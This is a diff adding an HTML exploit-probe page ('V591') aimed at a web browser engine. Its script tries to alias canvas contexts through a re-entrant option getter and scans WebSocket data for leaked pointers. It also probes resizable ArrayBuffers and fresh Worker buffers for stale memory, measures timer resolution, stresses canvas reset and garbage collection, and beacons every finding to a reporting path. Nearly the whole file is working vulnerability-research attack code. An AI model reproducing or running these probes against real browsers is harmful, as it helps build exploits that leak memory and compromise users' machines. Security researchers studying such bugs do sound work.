@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V591</title></head>
+<body><pre id="out">V591 — WS from HTTP + RAB grow-back + alias confirm</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+function bk(tag,body){
+  var u='/beacon/V591-'+tag+'?d='+encodeURIComponent(String(body).slice(0,800))+'&t='+Date.now();
+  try{new Image().src=u;}catch(e){}
+  setTimeout(function(){try{new Image().src=u+'&r=2';}catch(e){}},200);
+}
+function bufHex(buf,max){
+  var a=new Uint8Array(buf instanceof ArrayBuffer?buf:buf.buffer);
+  var s='';var n=Math.min(a.length,max||128);
+  for(var i=0;i<n;i++)s+=('0'+a[i].toString(16)).slice(-2);
+  return s;
+}
+
+bk('BOOT','v591-ws-rab-alias');
+say('V591: WS from HTTP + RAB grow-back + alias\n');
+
+/* ===== P1: V573 alias ===== */
+var innerCtx=null;
+var c1=document.createElement('canvas');
+c1.width=4;c1.height=4;
+var d={};
+Object.defineProperty(d,'alpha',{get:function(){
+  innerCtx=c1.getContext('2d');
+  return true;
+}});
+c1.getContext('bitmaprenderer',d);
+var c2=document.createElement('canvas');
+c2.width=4;c2.height=4;
+var ctx2=c2.getContext('2d');
+ctx2.lineWidth=31337.31337;
+var aliasOK=innerCtx&&(Math.abs(innerCtx.lineWidth-31337.31337)<0.001);
+bk('ALIAS',aliasOK?'YES':'NO');
+say('Alias: '+(aliasOK?'CONFIRMED':'FAILED'));
+
+/* ===== P2: WebSocket from HTTP page ===== */
+bk('P2','ws-http');
+say('\n--- WebSocket test (HTTP origin) ---');
+
+var wsConnected=false;
+var wsBinMsgs=[];
+var wsTextMsgs=[];
+var wsPtrHits=[];
+
+function scanPtrs(buf,label){
+  if(buf.byteLength<8)return;
+  var dv=new DataView(buf);
+  for(var j=0;j+8<=buf.byteLength&&j<8192;j+=4){
+    try{
+      var lo=dv.getUint32(j,true);
+      var hi=dv.getUint32(j+4,true);
+      if(hi>0&&hi<0x800000&&lo>0x1000){
+        var ptr='0x'+('00000000'+hi.toString(16)).slice(-8)+('00000000'+lo.toString(16)).slice(-8);
+        wsPtrHits.push(label+'@'+j+':'+ptr);
+        bk('PTR',label+'@'+j+':'+ptr);
+        say('  ** PTR '+label+'@'+j+': '+ptr);
+      }
+      if(hi>=0x7f00&&hi<=0x7fff){
+        var ptr2='0x'+('00000000'+hi.toString(16)).slice(-8)+('00000000'+lo.toString(16)).slice(-8);
+        wsPtrHits.push('7F:'+label+'@'+j+':'+ptr2);
+        bk('PTR7F',label+'@'+j+':'+ptr2);
+        say('  ** 7F-PTR '+label+'@'+j+': '+ptr2);
+      }
+    }catch(e){}
+  }
+}
+
+try{
+  var ws=new WebSocket('ws://'+location.hostname+':9090/v591');
+  ws.binaryType='arraybuffer';
+  bk('WS-CREATE','ok');
+
+  ws.onopen=function(){
+    wsConnected=true;
+    bk('WS-OPEN','connected');
+    say('WS: CONNECTED');
+    ws.send('V591-HELLO,alias='+aliasOK);
+  };
+
+  ws.onmessage=function(ev){
+    if(typeof ev.data==='string'){
+      wsTextMsgs.push(ev.data);
+      bk('WS-TEXT','len='+ev.data.length+':'+ev.data.slice(0,150));
+      say('WS txt('+ev.data.length+'): '+ev.data.slice(0,80));
+    }else if(ev.data instanceof ArrayBuffer){
+      var a=new Uint8Array(ev.data);
+      var nz=0;for(var i=0;i<a.length;i++)if(a[i])nz++;
+      wsBinMsgs.push({size:ev.data.byteLength,nz:nz});
+      bk('WS-BIN','sz='+ev.data.byteLength+',nz='+nz+',hex='+bufHex(ev.data,128));
+      say('WS bin('+ev.data.byteLength+'B) nz='+nz);
+      scanPtrs(ev.data,'ws'+wsBinMsgs.length);
+    }
+  };
+
+  ws.onerror=function(){bk('WS-ERR','error');say('WS ERROR');};
+  ws.onclose=function(ev){
+    bk('WS-CLOSE','code='+ev.code+',bin='+wsBinMsgs.length+',txt='+wsTextMsgs.length+',ptrs='+wsPtrHits.length);
+    say('WS close: code='+ev.code);
+  };
+}catch(e){
+  bk('WS-FAIL',e.name+':'+e.message.slice(0,100));
+  say('WS fail: '+e.message.slice(0,100));
+}
+
+/* ===== P3: RAB grow-back ===== */
+bk('P3','rab');
+say('\n--- RAB grow-back ---');
+
+try{
+  var rab=new ArrayBuffer(64,{maxByteLength:8192});
+  var rdv=new DataView(rab);
+  bk('RAB-OK','len='+rab.byteLength+',max='+rab.maxByteLength);
+
+  rab.resize(8192);
+  for(var i=0;i<8192;i+=8)
+    rdv.setBigUint64(i,BigInt('0xCAFEBABE00000000')+BigInt(i),true);
+  rab.resize(64);
+  rab.resize(8192);
+
+  var stale=0;var samples=[];
+  for(var i2=64;i2<8192;i2+=8){
+    var v=rdv.getBigUint64(i2,true);
+    if(v!==BigInt(0)){stale++;if(samples.length<8)samples.push(i2+':0x'+v.toString(16));}
+  }
+  bk('RAB1','stale='+stale+',s='+samples.join('|'));
+  say('T1 grow-back: stale='+stale);
+  if(samples.length>0)say('  '+samples.join(' '));
+
+  /* T2: Multi-RAB cross-contamination */
+  var rabs=[];
+  for(var ri=0;ri<30;ri++){
+    var r=new ArrayBuffer(128,{maxByteLength:4096});
+    r.resize(4096);
+    var dv=new DataView(r);
+    for(var j=0;j<4096;j+=8)dv.setBigUint64(j,BigInt(0xBB00+ri)*BigInt(0x100000000)+BigInt(j),true);
+    r.resize(128);
+    rabs.push(r);
+  }
+  var cross=0;var crossS=[];
+  for(var ri2=0;ri2<rabs.length;ri2++){
+    rabs[ri2].resize(4096);
+    var dv2=new DataView(rabs[ri2]);
+    for(var j2=128;j2<4096;j2+=128){
+      var v2=dv2.getBigUint64(j2,true);
+      if(v2!==BigInt(0)){cross++;if(crossS.length<5)crossS.push('r'+ri2+'@'+j2+':0x'+v2.toString(16));}
+    }
+  }
+  bk('RAB2','cross='+cross+',s='+crossS.join('|'));
+  say('T2 cross: leak='+cross);
+  if(crossS.length>0)say('  '+crossS.join(' '));
+
+}catch(e){
+  bk('RAB-ERR',e.name+':'+e.message.slice(0,80));
+  say('RAB: '+e.message.slice(0,80));
+}
+
+/* ===== P4: Date.now resolution ===== */
+var deltas=[];var last=Date.now();
+for(var ti=0;ti<200000&&deltas.length<10;ti++){var now=Date.now();if(now!==last){deltas.push(now-last);last=now;}}
+bk('TIMER','res='+deltas.join(','));
+say('\nTimer: '+deltas.join(','));
+
+/* ===== P5: Worker AB scan ===== */
+bk('P5','worker');
+try{
+  var wc='self.onmessage=function(){'+
+    'var nz=0;var vals=[];'+
+    'for(var i=0;i<3000;i++){'+
+    '  var ab=new ArrayBuffer(768);'+
+    '  var v=new Uint8Array(ab);'+
+    '  for(var j=0;j<768;j+=64){'+
+    '    if(v[j]!==0){nz++;if(vals.length<10)vals.push(i+":"+j+":"+v[j]);break;}'+
+    '  }'+
+    '}'+
+    'self.postMessage({nz:nz,vals:vals,total:3000});'+
+  '};';
+  var w=new Worker(URL.createObjectURL(new Blob([wc],{type:'application/javascript'})));
+  w.onmessage=function(e){
+    bk('WORKER',JSON.stringify(e.data));
+    say('Worker: nz='+e.data.nz+'/'+e.data.total);
+  };
+  w.onerror=function(e){bk('W-ERR',e.message?e.message.slice(0,60):'?');};
+  w.postMessage(0);
+}catch(e){bk('W-ERR2',e.name);}
+
+/* ===== P6: canvas reset stateStack test ===== */
+if(aliasOK){
+  bk('P6','reset');
+  say('\n--- canvas reset test ---');
+  var g=ctx2.createLinearGradient(0,0,100,100);
+  g.addColorStop(0,'red');g.addColorStop(1,'blue');
+  ctx2.strokeStyle=g;
+  for(var si=0;si<12;si++)ctx2.save();
+  ctx2.lineWidth=9999.9;
+  var pre=innerCtx.lineWidth;
+  bk('P6-PRE','lw='+pre);
+  say('Pre: lw='+pre);
+
+  c2.width=c2.width;
+
+  var post;try{post=innerCtx.lineWidth;}catch(e){post='CRASH:'+e.name;}
+  bk('P6-POST','lw='+post);
+  say('Post: lw='+post);
+
+  var post2;try{post2=ctx2.lineWidth;}catch(e){post2='CRASH:'+e.name;}
+  bk('P6-POST2','ctx2='+post2);
+  say('Post ctx2: lw='+post2);
+}
+
+/* ===== P7: GC via FinalizationRegistry ===== */
+bk('P7','gc');
+var gcFires=0;
+try{
+  var fr=new FinalizationRegistry(function(v){gcFires++;bk('GC',gcFires+':'+v);});
+  for(var gi=0;gi<30;gi++){var tmp={x:new ArrayBuffer(8192)};fr.register(tmp,'g'+gi);tmp=null;}
+  var junk=[];for(var ji=0;ji<5000;ji++)junk.push(new ArrayBuffer(4096));junk=null;
+  bk('GC-PUSH','applied');
+}catch(e){bk('GC-ERR',e.name);}
+
+/* ===== DONE ===== */
+setTimeout(function(){
+  bk('DONE',JSON.stringify({alias:aliasOK,ws:wsConnected,wsBin:wsBinMsgs.length,wsTxt:wsTextMsgs.length,ptrs:wsPtrHits.length,gc:gcFires}));
+  say('\nDONE');
+},20000);
+</script>
+</body></html>
